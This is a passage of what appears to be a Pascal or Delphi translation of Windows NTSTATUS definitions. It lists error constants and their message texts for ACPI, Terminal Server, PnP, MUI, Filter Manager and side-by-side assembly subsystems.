// MessageId: STATUS_ACPI_STACK_OVERFLOW
//
// MessageText:
//
// The AML Interpreter Stack has overflowed
//
STATUS_ACPI_STACK_OVERFLOW       = NTSTATUS($C0140002);

//
// MessageId: STATUS_ACPI_ASSERT_FAILED
//
// MessageText:
//
// An inconsistent state has occurred
//
STATUS_ACPI_ASSERT_FAILED        = NTSTATUS($C0140003);

//
// MessageId: STATUS_ACPI_INVALID_INDEX
//
// MessageText:
//
// An attempt was made to access an array outside of its bounds
//
STATUS_ACPI_INVALID_INDEX        = NTSTATUS($C0140004);

//
// MessageId: STATUS_ACPI_INVALID_ARGUMENT
//
// MessageText:
//
// A required argument was not specified
//
STATUS_ACPI_INVALID_ARGUMENT     = NTSTATUS($C0140005);

//
// MessageId: STATUS_ACPI_FATAL
//
// MessageText:
//
// A fatal error has occurred
//
STATUS_ACPI_FATAL                = NTSTATUS($C0140006);

//
// MessageId: STATUS_ACPI_INVALID_SUPERNAME
//
// MessageText:
//
// An invalid SuperName was specified
//
STATUS_ACPI_INVALID_SUPERNAME    = NTSTATUS($C0140007);

//
// MessageId: STATUS_ACPI_INVALID_ARGTYPE
//
// MessageText:
//
// An argument with an incorrect type was specified
//
STATUS_ACPI_INVALID_ARGTYPE      = NTSTATUS($C0140008);

//
// MessageId: STATUS_ACPI_INVALID_OBJTYPE
//
// MessageText:
//
// An object with an incorrect type was specified
//
STATUS_ACPI_INVALID_OBJTYPE      = NTSTATUS($C0140009);

//
// MessageId: STATUS_ACPI_INVALID_TARGETTYPE
//
// MessageText:
//
// A target with an incorrect type was specified
//
STATUS_ACPI_INVALID_TARGETTYPE   = NTSTATUS($C014000A);

//
// MessageId: STATUS_ACPI_INCORRECT_ARGUMENT_COUNT
//
// MessageText:
//
// An incorrect number of arguments were specified
//
STATUS_ACPI_INCORRECT_ARGUMENT_COUNT = NTSTATUS($C014000B);

//
// MessageId: STATUS_ACPI_ADDRESS_NOT_MAPPED
//
// MessageText:
//
// An address failed to translate
//
STATUS_ACPI_ADDRESS_NOT_MAPPED   = NTSTATUS($C014000C);

//
// MessageId: STATUS_ACPI_INVALID_EVENTTYPE
//
// MessageText:
//
// An incorrect event type was specified
//
STATUS_ACPI_INVALID_EVENTTYPE    = NTSTATUS($C014000D);

//
// MessageId: STATUS_ACPI_HANDLER_COLLISION
//
// MessageText:
//
// A handler for the target already exists
//
STATUS_ACPI_HANDLER_COLLISION    = NTSTATUS($C014000E);

//
// MessageId: STATUS_ACPI_INVALID_DATA
//
// MessageText:
//
// Invalid data for the target was specified
//
STATUS_ACPI_INVALID_DATA         = NTSTATUS($C014000F);

//
// MessageId: STATUS_ACPI_INVALID_REGION
//
// MessageText:
//
// An invalid region for the target was specified
//
STATUS_ACPI_INVALID_REGION       = NTSTATUS($C0140010);

//
// MessageId: STATUS_ACPI_INVALID_ACCESS_SIZE
//
// MessageText:
//
// An attempt was made to access a field outside of the defined range
//
STATUS_ACPI_INVALID_ACCESS_SIZE  = NTSTATUS($C0140011);

//
// MessageId: STATUS_ACPI_ACQUIRE_GLOBAL_LOCK
//
// MessageText:
//
// The Global system lock could not be acquired
//
STATUS_ACPI_ACQUIRE_GLOBAL_LOCK  = NTSTATUS($C0140012);

//
// MessageId: STATUS_ACPI_ALREADY_INITIALIZED
//
// MessageText:
//
// An attempt was made to reinitialize the ACPI subsystem
//
STATUS_ACPI_ALREADY_INITIALIZED  = NTSTATUS($C0140013);

//
// MessageId: STATUS_ACPI_NOT_INITIALIZED
//
// MessageText:
//
// The ACPI subsystem has not been initialized
//
STATUS_ACPI_NOT_INITIALIZED      = NTSTATUS($C0140014);

//
// MessageId: STATUS_ACPI_INVALID_MUTEX_LEVEL
//
// MessageText:
//
// An incorrect mutex was specified
//
STATUS_ACPI_INVALID_MUTEX_LEVEL  = NTSTATUS($C0140015);

//
// MessageId: STATUS_ACPI_MUTEX_NOT_OWNED
//
// MessageText:
//
// The mutex is not currently owned
//
STATUS_ACPI_MUTEX_NOT_OWNED      = NTSTATUS($C0140016);

//
// MessageId: STATUS_ACPI_MUTEX_NOT_OWNER
//
// MessageText:
//
// An attempt was made to access the mutex by a process that was not the owner
//
STATUS_ACPI_MUTEX_NOT_OWNER      = NTSTATUS($C0140017);

//
// MessageId: STATUS_ACPI_RS_ACCESS
//
// MessageText:
//
// An error occurred during an access to Region Space
//
STATUS_ACPI_RS_ACCESS            = NTSTATUS($C0140018);

//
// MessageId: STATUS_ACPI_INVALID_TABLE
//
// MessageText:
//
// An attempt was made to use an incorrect table
//
STATUS_ACPI_INVALID_TABLE        = NTSTATUS($C0140019);

//
// MessageId: STATUS_ACPI_REG_HANDLER_FAILED
//
// MessageText:
//
// The registration of an ACPI event failed
//
STATUS_ACPI_REG_HANDLER_FAILED   = NTSTATUS($C0140020);

//
// MessageId: STATUS_ACPI_POWER_REQUEST_FAILED
//
// MessageText:
//
// An ACPI Power Object failed to transition state
//
STATUS_ACPI_POWER_REQUEST_FAILED = NTSTATUS($C0140021);

//
// Terminal Server specific Errors
//
//
// MessageId: STATUS_CTX_WINSTATION_NAME_INVALID
//
// MessageText:
//
// Session name %1 is invalid.
//
STATUS_CTX_WINSTATION_NAME_INVALID = NTSTATUS($C00A0001);

//
// MessageId: STATUS_CTX_INVALID_PD
//
// MessageText:
//
// The protocol driver %1 is invalid.
//
STATUS_CTX_INVALID_PD            = NTSTATUS($C00A0002);

//
// MessageId: STATUS_CTX_PD_NOT_FOUND
//
// MessageText:
//
// The protocol driver %1 was not found in the system path.
//
STATUS_CTX_PD_NOT_FOUND          = NTSTATUS($C00A0003);

//
// MessageId: STATUS_CTX_CDM_CONNECT
//
// MessageText:
//
// The Client Drive Mapping Service Has Connected on Terminal Connection.
//
STATUS_CTX_CDM_CONNECT           = NTSTATUS($400A0004);

//
// MessageId: STATUS_CTX_CDM_DISCONNECT
//
// MessageText:
//
// The Client Drive Mapping Service Has Disconnected on Terminal Connection.
//
STATUS_CTX_CDM_DISCONNECT        = NTSTATUS($400A0005);

//
// MessageId: STATUS_CTX_CLOSE_PENDING
//
// MessageText:
//
// A close operation is pending on the Terminal Connection.
//
STATUS_CTX_CLOSE_PENDING         = NTSTATUS($C00A0006);

//
// MessageId: STATUS_CTX_NO_OUTBUF
//
// MessageText:
//
// There are no free output buffers available.
//
STATUS_CTX_NO_OUTBUF             = NTSTATUS($C00A0007);

//
// MessageId: STATUS_CTX_MODEM_INF_NOT_FOUND
//
// MessageText:
//
// The MODEM.INF file was not found.
//
STATUS_CTX_MODEM_INF_NOT_FOUND   = NTSTATUS($C00A0008);

//
// MessageId: STATUS_CTX_INVALID_MODEMNAME
//
// MessageText:
//
// The modem (%1) was not found in MODEM.INF.
//
STATUS_CTX_INVALID_MODEMNAME     = NTSTATUS($C00A0009);

//
// MessageId: STATUS_CTX_RESPONSE_ERROR
//
// MessageText:
//
// The modem did not accept the command sent to it.
// Verify the configured modem name matches the attached modem.
//
STATUS_CTX_RESPONSE_ERROR        = NTSTATUS($C00A000A);

//
// MessageId: STATUS_CTX_MODEM_RESPONSE_TIMEOUT
//
// MessageText:
//
// The modem did not respond to the command sent to it.
// Verify the modem is properly cabled and powered on.
//
STATUS_CTX_MODEM_RESPONSE_TIMEOUT = NTSTATUS($C00A000B);

//
// MessageId: STATUS_CTX_MODEM_RESPONSE_NO_CARRIER
//
// MessageText:
//
// Carrier detect has failed or carrier has been dropped due to disconnect.
//
STATUS_CTX_MODEM_RESPONSE_NO_CARRIER = NTSTATUS($C00A000C);

//
// MessageId: STATUS_CTX_MODEM_RESPONSE_NO_DIALTONE
//
// MessageText:
//
// Dial tone not detected within required time.
// Verify phone cable is properly attached and functional.
//
STATUS_CTX_MODEM_RESPONSE_NO_DIALTONE = NTSTATUS($C00A000D);

//
// MessageId: STATUS_CTX_MODEM_RESPONSE_BUSY
//
// MessageText:
//
// Busy signal detected at remote site on callback.
//
STATUS_CTX_MODEM_RESPONSE_BUSY   = NTSTATUS($C00A000E);

//
// MessageId: STATUS_CTX_MODEM_RESPONSE_VOICE
//
// MessageText:
//
// Voice detected at remote site on callback.
//
STATUS_CTX_MODEM_RESPONSE_VOICE  = NTSTATUS($C00A000F);

//
// MessageId: STATUS_CTX_TD_ERROR
//
// MessageText:
//
// Transport driver error
//
STATUS_CTX_TD_ERROR              = NTSTATUS($C00A0010);

//
// MessageId: STATUS_CTX_LICENSE_CLIENT_INVALID
//
// MessageText:
//
// The client you are using is not licensed to use this system. Your logon request is denied.
//
STATUS_CTX_LICENSE_CLIENT_INVALID = NTSTATUS($C00A0012);

//
// MessageId: STATUS_CTX_LICENSE_NOT_AVAILABLE
//
// MessageText:
//
// The system has reached its licensed logon limit.
// Please try again later.
//
STATUS_CTX_LICENSE_NOT_AVAILABLE = NTSTATUS($C00A0013);

//
// MessageId: STATUS_CTX_LICENSE_EXPIRED
//
// MessageText:
//
// The system license has expired. Your logon request is denied.
//
STATUS_CTX_LICENSE_EXPIRED       = NTSTATUS($C00A0014);

//
// MessageId: STATUS_CTX_WINSTATION_NOT_FOUND
//
// MessageText:
//
// The specified session cannot be found.
//
STATUS_CTX_WINSTATION_NOT_FOUND  = NTSTATUS($C00A0015);

//
// MessageId: STATUS_CTX_WINSTATION_NAME_COLLISION
//
// MessageText:
//
// The specified session name is already in use.
//
STATUS_CTX_WINSTATION_NAME_COLLISION = NTSTATUS($C00A0016);

//
// MessageId: STATUS_CTX_WINSTATION_BUSY
//
// MessageText:
//
// The task you are trying to do can't be completed because Remote Desktop Services is currently busy. Please try again in a few minutes. Other users should still be able to log on.
//
STATUS_CTX_WINSTATION_BUSY       = NTSTATUS($C00A0017);

//
// MessageId: STATUS_CTX_BAD_VIDEO_MODE
//
// MessageText:
//
// An attempt has been made to connect to a session whose video mode is not supported by the current client.
//
STATUS_CTX_BAD_VIDEO_MODE        = NTSTATUS($C00A0018);

//
// MessageId: STATUS_CTX_GRAPHICS_INVALID
//
// MessageText:
//
// The application attempted to enable DOS graphics mode.
// DOS graphics mode is not supported.
//
STATUS_CTX_GRAPHICS_INVALID      = NTSTATUS($C00A0022);

//
// MessageId: STATUS_CTX_NOT_CONSOLE
//
// MessageText:
//
// The requested operation can be performed only on the system console.
// This is most often the result of a driver or system DLL requiring direct console access.
//
STATUS_CTX_NOT_CONSOLE           = NTSTATUS($C00A0024);

//
// MessageId: STATUS_CTX_CLIENT_QUERY_TIMEOUT
//
// MessageText:
//
// The client failed to respond to the server connect message.
//
STATUS_CTX_CLIENT_QUERY_TIMEOUT  = NTSTATUS($C00A0026);

//
// MessageId: STATUS_CTX_CONSOLE_DISCONNECT
//
// MessageText:
//
// Disconnecting the console session is not supported.
//
STATUS_CTX_CONSOLE_DISCONNECT    = NTSTATUS($C00A0027);

//
// MessageId: STATUS_CTX_CONSOLE_CONNECT
//
// MessageText:
//
// Reconnecting a disconnected session to the console is not supported.
//
STATUS_CTX_CONSOLE_CONNECT       = NTSTATUS($C00A0028);

//
// MessageId: STATUS_CTX_SHADOW_DENIED
//
// MessageText:
//
// The request to control another session remotely was denied.
//
STATUS_CTX_SHADOW_DENIED         = NTSTATUS($C00A002A);

//
// MessageId: STATUS_CTX_WINSTATION_ACCESS_DENIED
//
// MessageText:
//
// A process has requested access to a session, but has not been granted those access rights.
//
STATUS_CTX_WINSTATION_ACCESS_DENIED = NTSTATUS($C00A002B);

//
// MessageId: STATUS_CTX_INVALID_WD
//
// MessageText:
//
// The Terminal Connection driver %1 is invalid.
//
STATUS_CTX_INVALID_WD            = NTSTATUS($C00A002E);

//
// MessageId: STATUS_CTX_WD_NOT_FOUND
//
// MessageText:
//
// The Terminal Connection driver %1 was not found in the system path.
//
STATUS_CTX_WD_NOT_FOUND          = NTSTATUS($C00A002F);

//
// MessageId: STATUS_CTX_SHADOW_INVALID
//
// MessageText:
//
// The requested session cannot be controlled remotely.
// You cannot control your own session, a session that is trying to control your session,
// a session that has no user logged on, nor control other sessions from the console.
//
STATUS_CTX_SHADOW_INVALID        = NTSTATUS($C00A0030);

//
// MessageId: STATUS_CTX_SHADOW_DISABLED
//
// MessageText:
//
// The requested session is not configured to allow remote control.
//
STATUS_CTX_SHADOW_DISABLED       = NTSTATUS($C00A0031);

//
// MessageId: STATUS_RDP_PROTOCOL_ERROR
//
// MessageText:
//
// The RDP protocol component %2 detected an error in the protocol stream and has disconnected the client.
//
STATUS_RDP_PROTOCOL_ERROR        = NTSTATUS($C00A0032);

//
// MessageId: STATUS_CTX_CLIENT_LICENSE_NOT_SET
//
// MessageText:
//
// Your request to connect to this Terminal server has been rejected.
// Your Terminal Server Client license number has not been entered for this copy of the Terminal Client.
// Please call your system administrator for help in entering a valid, unique license number for this Terminal Server Client.
// Click OK to continue.
//
STATUS_CTX_CLIENT_LICENSE_NOT_SET = NTSTATUS($C00A0033);

//
// MessageId: STATUS_CTX_CLIENT_LICENSE_IN_USE
//
// MessageText:
//
// Your request to connect to this Terminal server has been rejected.
// Your Terminal Server Client license number is currently being used by another user.
// Please call your system administrator to obtain a new copy of the Terminal Server Client with a valid, unique license number.
// Click OK to continue.
//
STATUS_CTX_CLIENT_LICENSE_IN_USE = NTSTATUS($C00A0034);

//
// MessageId: STATUS_CTX_SHADOW_ENDED_BY_MODE_CHANGE
//
// MessageText:
//
// The remote control of the console was terminated because the display mode was changed. Changing the display mode in a remote control session is not supported.
//
STATUS_CTX_SHADOW_ENDED_BY_MODE_CHANGE = NTSTATUS($C00A0035);

//
// MessageId: STATUS_CTX_SHADOW_NOT_RUNNING
//
// MessageText:
//
// Remote control could not be terminated because the specified session is not currently being remotely controlled.
//
STATUS_CTX_SHADOW_NOT_RUNNING    = NTSTATUS($C00A0036);

//
// MessageId: STATUS_CTX_LOGON_DISABLED
//
// MessageText:
//
// Your interactive logon privilege has been disabled.
// Please contact your system administrator.
//
STATUS_CTX_LOGON_DISABLED        = NTSTATUS($C00A0037);

//
// MessageId: STATUS_CTX_SECURITY_LAYER_ERROR
//
// MessageText:
//
// The Terminal Server security layer detected an error in the protocol stream and has disconnected the client.
// Client IP: %2.
//
STATUS_CTX_SECURITY_LAYER_ERROR  = NTSTATUS($C00A0038);

//
// MessageId: STATUS_TS_INCOMPATIBLE_SESSIONS
//
// MessageText:
//
// The target session is incompatible with the current session.
//
STATUS_TS_INCOMPATIBLE_SESSIONS  = NTSTATUS($C00A0039);

//
// MessageId: STATUS_TS_VIDEO_SUBSYSTEM_ERROR
//
// MessageText:
//
// Windows can't connect to your session because a problem occurred in the Windows video subsystem. Try connecting again later, or contact the server administrator for assistance.
//
STATUS_TS_VIDEO_SUBSYSTEM_ERROR  = NTSTATUS($C00A003A);


//
//  IO error values
//

//
// MessageId: STATUS_PNP_BAD_MPS_TABLE
//
// MessageText:
//
// A device is missing in the system BIOS MPS table. This device will not be used.
// Please contact your system vendor for system BIOS update.
//
STATUS_PNP_BAD_MPS_TABLE         = NTSTATUS($C0040035);

//
// MessageId: STATUS_PNP_TRANSLATION_FAILED
//
// MessageText:
//
// A translator failed to translate resources.
//
STATUS_PNP_TRANSLATION_FAILED    = NTSTATUS($C0040036);

//
// MessageId: STATUS_PNP_IRQ_TRANSLATION_FAILED
//
// MessageText:
//
// A IRQ translator failed to translate resources.
//
STATUS_PNP_IRQ_TRANSLATION_FAILED = NTSTATUS($C0040037);

//
// MessageId: STATUS_PNP_INVALID_ID
//
// MessageText:
//
// Driver %2 returned invalid ID for a child device (%3).
//
STATUS_PNP_INVALID_ID            = NTSTATUS($C0040038);

//
// MessageId: STATUS_IO_REISSUE_AS_CACHED
//
// MessageText:
//
// Reissue the given operation as a cached IO operation
//
STATUS_IO_REISSUE_AS_CACHED      = NTSTATUS($C0040039);


//
//  MUI error values
//

//
// MessageId: STATUS_MUI_FILE_NOT_FOUND
//
// MessageText:
//
// The resource loader failed to find MUI file.
//
STATUS_MUI_FILE_NOT_FOUND        = NTSTATUS($C00B0001);

//
// MessageId: STATUS_MUI_INVALID_FILE
//
// MessageText:
//
// The resource loader failed to load MUI file because the file fail to pass validation.
//
STATUS_MUI_INVALID_FILE          = NTSTATUS($C00B0002);

//
// MessageId: STATUS_MUI_INVALID_RC_CONFIG
//
// MessageText:
//
// The RC Manifest is corrupted with garbage data or unsupported version or missing required item.
//
STATUS_MUI_INVALID_RC_CONFIG     = NTSTATUS($C00B0003);

//
// MessageId: STATUS_MUI_INVALID_LOCALE_NAME
//
// MessageText:
//
// The RC Manifest has invalid culture name.
//
STATUS_MUI_INVALID_LOCALE_NAME   = NTSTATUS($C00B0004);

//
// MessageId: STATUS_MUI_INVALID_ULTIMATEFALLBACK_NAME
//
// MessageText:
//
// The RC Manifest has invalid ultimatefallback name.
//
STATUS_MUI_INVALID_ULTIMATEFALLBACK_NAME = NTSTATUS($C00B0005);

//
// MessageId: STATUS_MUI_FILE_NOT_LOADED
//
// MessageText:
//
// The resource loader cache doesn't have loaded MUI entry.
//
STATUS_MUI_FILE_NOT_LOADED       = NTSTATUS($C00B0006);

//
// MessageId: STATUS_RESOURCE_ENUM_USER_STOP
//
// MessageText:
//
// User stopped resource enumeration.
//
STATUS_RESOURCE_ENUM_USER_STOP   = NTSTATUS($C00B0007);


//
//  Filter Manager error values
//

//
// MessageId: STATUS_FLT_NO_HANDLER_DEFINED
//
// MessageText:
//
// A handler was not defined by the filter for this operation.
//
STATUS_FLT_NO_HANDLER_DEFINED    = NTSTATUS($C01C0001);

//
// MessageId: STATUS_FLT_CONTEXT_ALREADY_DEFINED
//
// MessageText:
//
// A context is already defined for this object.
//
STATUS_FLT_CONTEXT_ALREADY_DEFINED = NTSTATUS($C01C0002);

//
// MessageId: STATUS_FLT_INVALID_ASYNCHRONOUS_REQUEST
//
// MessageText:
//
// Asynchronous requests are not valid for this operation.
//
STATUS_FLT_INVALID_ASYNCHRONOUS_REQUEST = NTSTATUS($C01C0003);

//
// MessageId: STATUS_FLT_DISALLOW_FAST_IO
//
// MessageText:
//
// Internal error code used by the filter manager to determine if a fastio operation should be forced down the IRP path. Mini-filters should never return this value.
//
STATUS_FLT_DISALLOW_FAST_IO      = NTSTATUS($C01C0004);

//
//  The same code used to disallow fast IO is also used to disallow the FS
//  filter QueryOpen callback.
//

STATUS_FLT_DISALLOW_FSFILTER_IO = STATUS_FLT_DISALLOW_FAST_IO;

//
// MessageId: STATUS_FLT_INVALID_NAME_REQUEST
//
// MessageText:
//
// An invalid name request was made. The name requested cannot be retrieved at this time.
//
STATUS_FLT_INVALID_NAME_REQUEST  = NTSTATUS($C01C0005);

//
// MessageId: STATUS_FLT_NOT_SAFE_TO_POST_OPERATION
//
// MessageText:
//
// Posting this operation to a worker thread for further processing is not safe at this time because it could lead to a system deadlock.
//
STATUS_FLT_NOT_SAFE_TO_POST_OPERATION = NTSTATUS($C01C0006);

//
// MessageId: STATUS_FLT_NOT_INITIALIZED
//
// MessageText:
//
// The Filter Manager was not initialized when a filter tried to register. Make sure that the Filter Manager is getting loaded as a driver.
//
STATUS_FLT_NOT_INITIALIZED       = NTSTATUS($C01C0007);

//
// MessageId: STATUS_FLT_FILTER_NOT_READY
//
// MessageText:
//
// The filter is not ready for attachment to volumes because it has not finished initializing (FltStartFiltering has not been called).
//
STATUS_FLT_FILTER_NOT_READY      = NTSTATUS($C01C0008);

//
// MessageId: STATUS_FLT_POST_OPERATION_CLEANUP
//
// MessageText:
//
// The filter must cleanup any operation specific context at this time because it is being removed from the system before the operation is completed by the lower drivers.
//
STATUS_FLT_POST_OPERATION_CLEANUP = NTSTATUS($C01C0009);

//
// MessageId: STATUS_FLT_INTERNAL_ERROR
//
// MessageText:
//
// The Filter Manager had an internal error from which it cannot recover, therefore the operation has been failed. This is usually the result of a filter returning an invalid value from a pre-operation callback.
//
STATUS_FLT_INTERNAL_ERROR        = NTSTATUS($C01C000A);

//
// MessageId: STATUS_FLT_DELETING_OBJECT
//
// MessageText:
//
// The object specified for this action is in the process of being deleted, therefore the action requested cannot be completed at this time.
//
STATUS_FLT_DELETING_OBJECT       = NTSTATUS($C01C000B);

//
// MessageId: STATUS_FLT_MUST_BE_NONPAGED_POOL
//
// MessageText:
//
// Non-paged pool must be used for this type of context.
//
STATUS_FLT_MUST_BE_NONPAGED_POOL = NTSTATUS($C01C000C);

//
// MessageId: STATUS_FLT_DUPLICATE_ENTRY
//
// MessageText:
//
// A duplicate handler definition has been provided for an operation.
//
STATUS_FLT_DUPLICATE_ENTRY       = NTSTATUS($C01C000D);

//
// MessageId: STATUS_FLT_CBDQ_DISABLED
//
// MessageText:
//
// The callback data queue has been disabled.
//
STATUS_FLT_CBDQ_DISABLED         = NTSTATUS($C01C000E);

//
// MessageId: STATUS_FLT_DO_NOT_ATTACH
//
// MessageText:
//
// Do not attach the filter to the volume at this time.
//
STATUS_FLT_DO_NOT_ATTACH         = NTSTATUS($C01C000F);

//
// MessageId: STATUS_FLT_DO_NOT_DETACH
//
// MessageText:
//
// Do not detach the filter from the volume at this time.
//
STATUS_FLT_DO_NOT_DETACH         = NTSTATUS($C01C0010);

//
// MessageId: STATUS_FLT_INSTANCE_ALTITUDE_COLLISION
//
// MessageText:
//
// An instance already exists at this altitude on the volume specified.
//
STATUS_FLT_INSTANCE_ALTITUDE_COLLISION = NTSTATUS($C01C0011);

//
// MessageId: STATUS_FLT_INSTANCE_NAME_COLLISION
//
// MessageText:
//
// An instance already exists with this name on the volume specified.
//
STATUS_FLT_INSTANCE_NAME_COLLISION = NTSTATUS($C01C0012);

//
// MessageId: STATUS_FLT_FILTER_NOT_FOUND
//
// MessageText:
//
// The system could not find the filter specified.
//
STATUS_FLT_FILTER_NOT_FOUND      = NTSTATUS($C01C0013);

//
// MessageId: STATUS_FLT_VOLUME_NOT_FOUND
//
// MessageText:
//
// The system could not find the volume specified.
//
STATUS_FLT_VOLUME_NOT_FOUND      = NTSTATUS($C01C0014);

//
// MessageId: STATUS_FLT_INSTANCE_NOT_FOUND
//
// MessageText:
//
// The system could not find the instance specified.
//
STATUS_FLT_INSTANCE_NOT_FOUND    = NTSTATUS($C01C0015);

//
// MessageId: STATUS_FLT_CONTEXT_ALLOCATION_NOT_FOUND
//
// MessageText:
//
// No registered context allocation definition was found for the given request.
//
STATUS_FLT_CONTEXT_ALLOCATION_NOT_FOUND = NTSTATUS($C01C0016);

//
// MessageId: STATUS_FLT_INVALID_CONTEXT_REGISTRATION
//
// MessageText:
//
// An invalid parameter was specified during context registration.
//
STATUS_FLT_INVALID_CONTEXT_REGISTRATION = NTSTATUS($C01C0017);

//
// MessageId: STATUS_FLT_NAME_CACHE_MISS
//
// MessageText:
//
// The name requested was not found in Filter Manager's name cache and could not be retrieved from the file system.
//
STATUS_FLT_NAME_CACHE_MISS       = NTSTATUS($C01C0018);

//
// MessageId: STATUS_FLT_NO_DEVICE_OBJECT
//
// MessageText:
//
// The requested device object does not exist for the given volume.
//
STATUS_FLT_NO_DEVICE_OBJECT      = NTSTATUS($C01C0019);

//
// MessageId: STATUS_FLT_VOLUME_ALREADY_MOUNTED
//
// MessageText:
//
// The specified volume is already mounted.
//
STATUS_FLT_VOLUME_ALREADY_MOUNTED = NTSTATUS($C01C001A);

//
// MessageId: STATUS_FLT_ALREADY_ENLISTED
//
// MessageText:
//
// The specified Transaction Context is already enlisted in a transaction
//
STATUS_FLT_ALREADY_ENLISTED      = NTSTATUS($C01C001B);

//
// MessageId: STATUS_FLT_CONTEXT_ALREADY_LINKED
//
// MessageText:
//
// The specified context is already attached to another object
//
STATUS_FLT_CONTEXT_ALREADY_LINKED = NTSTATUS($C01C001C);

//
// MessageId: STATUS_FLT_NO_WAITER_FOR_REPLY
//
// MessageText:
//
// No waiter is present for the filter's reply to this message.
//
STATUS_FLT_NO_WAITER_FOR_REPLY   = NTSTATUS($C01C0020);

//
// MessageId: STATUS_FLT_REGISTRATION_BUSY
//
// MessageText:
//
// The filesystem database resource is in use. Registration cannot complete at this time.
//
STATUS_FLT_REGISTRATION_BUSY     = NTSTATUS($C01C0023);


//
//  Side-by-side (SXS) error values
//

//
// MessageId: STATUS_SXS_SECTION_NOT_FOUND
//
// MessageText:
//
// The requested section is not present in the activation context.
//
STATUS_SXS_SECTION_NOT_FOUND     = NTSTATUS($C0150001);

//
// MessageId: STATUS_SXS_CANT_GEN_ACTCTX
//
// MessageText:
//
// Windows was not able to process the application binding information.
// Please refer to your System Event Log for further information.
//
STATUS_SXS_CANT_GEN_ACTCTX       = NTSTATUS($C0150002);

//
// MessageId: STATUS_SXS_INVALID_ACTCTXDATA_FORMAT
//
// MessageText:
//
// The application binding data format is invalid.
//
STATUS_SXS_INVALID_ACTCTXDATA_FORMAT = NTSTATUS($C0150003);

//
// MessageId: STATUS_SXS_ASSEMBLY_NOT_FOUND
//
// MessageText:
//
// The referenced assembly is not installed on your system.
//
STATUS_SXS_ASSEMBLY_NOT_FOUND    = NTSTATUS($C0150004);

//
// MessageId: STATUS_SXS_MANIFEST_FORMAT_ERROR
//
// MessageText:
//
// The manifest file does not begin with the required tag and format information.
//
STATUS_SXS_MANIFEST_FORMAT_ERROR = NTSTATUS($C0150005);

//
// MessageId: STATUS_SXS_MANIFEST_PARSE_ERROR
//
// MessageText:
//
// The manifest file contains one or more syntax errors.
//
STATUS_SXS_MANIFEST_PARSE_ERROR  = NTSTATUS($C0150006);

//
// MessageId: STATUS_SXS_ACTIVATION_CONTEXT_DISABLED
//
// MessageText:
//
// The application attempted to activate a disabled activation context.
//
STATUS_SXS_ACTIVATION_CONTEXT_DISABLED = NTSTATUS($C0150007);

//
// MessageId: STATUS_SXS_KEY_NOT_FOUND
//
// MessageText:
//
// The requested lookup key was not found in any active activation context.
//
STATUS_SXS_KEY_NOT_FOUND         = NTSTATUS($C0150008);

//
// MessageId: STATUS_SXS_VERSION_CONFLICT
//
// MessageText:
//
// A component version required by the application conflicts with another component version already active.
//
STATUS_SXS_VERSION_CONFLICT      = NTSTATUS($C0150009);

//
// MessageId: STATUS_SXS_WRONG_SECTION_TYPE
//
// MessageText:
//
// The type requested activation context section does not match the query API used.
//
STATUS_SXS_WRONG_SECTION_TYPE    = NTSTATUS($C015000A);

//
// MessageId: STATUS_SXS_THREAD_QUERIES_DISABLED
//
// MessageText:
//
// Lack of system resources has required isolated activation to be disabled for the current thread of execution.
//
STATUS_SXS_THREAD_QUERIES_DISABLED = NTSTATUS($C015000B);

//
// MessageId: STATUS_SXS_ASSEMBLY_MISSING
//
// MessageText:
//
// The referenced assembly could not be found.
//
STATUS_SXS_ASSEMBLY_MISSING      = NTSTATUS($C015000C);

//
// MessageId: STATUS_SXS_RELEASE_ACTIVATION_CONTEXT
//
// MessageText:
//
// A kernel mode component is releasing a reference on an activation context.
//
STATUS_SXS_RELEASE_ACTIVATION_CONTEXT = NTSTATUS($4015000D);

//
// MessageId: STATUS_SXS_PROCESS_DEFAULT_ALREADY_SET
//
// MessageText:
//
// An attempt to set the process default activation context failed because the process default activation context was already set.
//
STATUS_SXS_PROCESS_DEFAULT_ALREADY_SET = NTSTATUS($C015000E);

//
// MessageId: STATUS_SXS_EARLY_DEACTIVATION
//
// MessageText:
//
// The activation context being deactivated is not the most recently activated one.
//
STATUS_SXS_EARLY_DEACTIVATION    = NTSTATUS($C015000F);    // winnt

//
// MessageId: STATUS_SXS_INVALID_DEACTIVATION
//
// MessageText:
//
// The activation context being deactivated is not active for the current thread of execution.
//
STATUS_SXS_INVALID_DEACTIVATION  = NTSTATUS($C0150010);    // winnt

//
// MessageId: STATUS_SXS_MULTIPLE_DEACTIVATION
//
// MessageText:
//
// The activation context being deactivated has already been deactivated.
//
STATUS_SXS_MULTIPLE_DEACTIVATION = NTSTATUS($C0150011);

//
// MessageId: STATUS_SXS_SYSTEM_DEFAULT_ACTIVATION_CONTEXT_EMPTY
//
// MessageText:
//
// The activation context of system default assembly could not be generated.
//
STATUS_SXS_SYSTEM_DEFAULT_ACTIVATION_CONTEXT_EMPTY = NTSTATUS($C0150012);

//
// MessageId: STATUS_SXS_PROCESS_TERMINATION_REQUESTED
//
// MessageText:
//
// A component used by the isolation facility has requested to terminate the process.
//
STATUS_SXS_PROCESS_TERMINATION_REQUESTED = NTSTATUS($C0150013);

//
// MessageId: STATUS_SXS_CORRUPT_ACTIVATION_STACK
//
// MessageText:
//
// The activation context activation stack for the running thread of execution is corrupt.
//
STATUS_SXS_CORRUPT_ACTIVATION_STACK = NTSTATUS($C0150014);

//
// MessageId: STATUS_SXS_CORRUPTION
//
// MessageText:
//
// The application isolation metadata for this process or thread has become corrupt.
//
STATUS_SXS_CORRUPTION            = NTSTATUS($C0150015);

//
// MessageId: STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_VALUE
//
// MessageText:
//
// The value of an attribute in an identity is not within the legal range.
//
STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_VALUE = NTSTATUS($C0150016);

//
// MessageId: STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_NAME
//
// MessageText:
//
// The name of an attribute in an identity is not within the legal range.
//
STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_NAME = NTSTATUS($C0150017);

//
// MessageId: STATUS_SXS_IDENTITY_DUPLICATE_ATTRIBUTE
//
// MessageText:
//
// An identity contains two definitions for the same attribute.
//
STATUS_SXS_IDENTITY_DUPLICATE_ATTRIBUTE = NTSTATUS($C0150018);

//
// MessageId: STATUS_SXS_IDENTITY_PARSE_ERROR
//
// MessageText:
//
// The identity string is malformed. This may be due to a trailing comma, more than two unnamed attributes, missing attribute name or missing attribute value.
//
STATUS_SXS_IDENTITY_PARSE_ERROR  = NTSTATUS($C0150019);

//
// MessageId: STATUS_SXS_COMPONENT_STORE_CORRUPT
//
// MessageText:
//
// The component store has been corrupted.
//
